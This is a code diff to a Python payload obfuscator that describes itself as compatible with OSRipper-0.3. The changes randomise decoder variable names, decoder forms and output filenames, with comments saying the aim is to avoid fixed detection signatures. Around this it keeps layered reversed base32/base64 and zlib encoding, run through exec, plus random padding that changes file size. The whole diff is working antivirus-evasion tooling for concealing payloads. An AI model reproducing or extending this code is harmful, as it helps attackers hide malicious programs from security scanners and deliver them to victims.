@@ -9,11 +9,47 @@ import sys
 import zlib
 import base64
 import random
+import secrets
+import string
 
 # Encoding functions (OSRipper-0.3 compatible)
 zlb = lambda in_ : zlib.compress(in_)
 b32 = lambda in_ : base64.b32encode(in_)
 b64 = lambda in_ : base64.b64encode(in_)
+
+
+def _random_name(length=2):
+    """Random identifier to avoid fixed decoder signatures."""
+    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(length))
+
+
+def _random_decoder(encoding):
+    """Build decoder line (b32 or b64) with random variable names and one of several forms."""
+    dec_var = _random_name(random.randint(2, 4))
+    arg_var = _random_name(random.randint(2, 4))
+    while arg_var == dec_var:
+        arg_var = _random_name(random.randint(2, 4))
+    decode_fn = 'b32decode' if encoding == 'b32' else 'b64decode'
+    style = random.randint(0, 2)
+    if style == 0:
+        return (
+            f"{dec_var}=lambda {arg_var}:__import__('zlib').decompress(__import__('base64').{decode_fn}({arg_var}[::-1]));",
+            dec_var,
+        )
+    if style == 1:
+        z, b = _random_name(1), _random_name(1)
+        while b == z:
+            b = _random_name(1)
+        return (
+            f"{z}=__import__('zlib');{b}=__import__('base64');{dec_var}=lambda {arg_var}:{z}.decompress({b}.{decode_fn}({arg_var}[::-1]));",
+            dec_var,
+        )
+    m = _random_name(1)
+    return (
+        f"{m}=__import__('base64');{dec_var}=lambda {arg_var}:__import__('zlib').decompress(getattr({m},'{decode_fn}')({arg_var}[::-1]));",
+        dec_var,
+    )
+
 
 class FileSize:
     def datas(self, z):
@@ -103,37 +139,24 @@ def Encode(data, output):
     data = add_random_padding(data)
     print("[+] Random padding added")
     
-    # Debug: Print the final payload before encoding
-    print("\n" + "="*60)
-    print("DEBUG: Final payload before encoding (first 50 lines):")
-    print("="*60)
-    print('\n'.join(data.split('\n')[:50]))
-    print("... (truncated) ...")
-    print("="*60 + "\n")
-    
-    # OSRipper-0.3 double-layer encoding approach
-    # First layer: b32 + zlib encoding
+    # OSRipper-0.3 double-layer encoding with randomized decoder signatures
+    heading1, dec1 = _random_decoder('b32')
+    heading2, dec2 = _random_decoder('b64')
     x1 = "b32(zlb(data.encode('utf8')))[::-1]"
-    heading1 = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
-    
-    # Second layer: b64 + zlib encoding
     x2 = "b64(zlb(data.encode('utf8')))[::-1]"
-    heading2 = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
-    
-    # Apply first encoding layer (b32) with its own random count
     print(f"[*] Applying {loop_b32} layers of b32+zlib encoding...")
     for x in range(loop_b32):
         try:
-            data = "exec((_)(%s))" % repr(eval(x1))
+            data = "exec((%s)(%s))" % (dec1, repr(eval(x1)))
         except TypeError as s:
             sys.exit(" TypeError : " + str(s))
-    ab=(heading1 + data)
+    ab = heading1 + "\n" + data
     for x in range(loop_b64):
         try:
-            data = "exec((_)(%s))" % repr(eval(x2))
+            data = "exec((%s)(%s))" % (dec2, repr(eval(x2)))
         except TypeError as s:
             sys.exit(" TypeError : " + str(s))
-    abc=(heading2 + ab)
+    abc = heading2 + "\n" + ab
     
     # Write final encoded payload
     with open(output, 'w') as f:
@@ -142,25 +165,29 @@ def Encode(data, output):
     
     print(f"[+] Double-layer encoding complete: {loop_b32}x b32 + {loop_b64}x b64 = {loop_b32 + loop_b64} total layers")
 
-def MainMenu(file):
-    """Main obfuscation entry point (backward compatibility)."""
+def MainMenu(file, random_suffix=False):
+    """
+    Main obfuscation entry point. If random_suffix=True, output name is randomized to reduce filename signatures.
+    Returns the output filename (basename).
+    """
     try:
         data = open(file).read()
     except IOError:
         sys.exit("\n File Not Found!")
-    
-    output = file.lower().replace('.py', '') + '_or.py'
-    
-    print(f"Starting advanced OSRipper-0.3 double-layer obfuscation (each layer: 30-60 random iterations)...")
+    base = file.lower().replace('.py', '')
+    if random_suffix:
+        output = base + "_" + secrets.token_hex(2) + ".py"
+    else:
+        output = base + "_or.py"
+    print("Starting advanced OSRipper-0.3 double-layer obfuscation (each layer: 30-60 random iterations)...")
     Encode(data, output)
-    print("Sandbox detection added")
     print("Random padding applied (randomizes file size)")
     FileSize(output)
+    return output
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
         print("Usage: python obfuscator_enhanced.py <file.py>")
         sys.exit(1)
-    
     MainMenu(sys.argv[1])
 
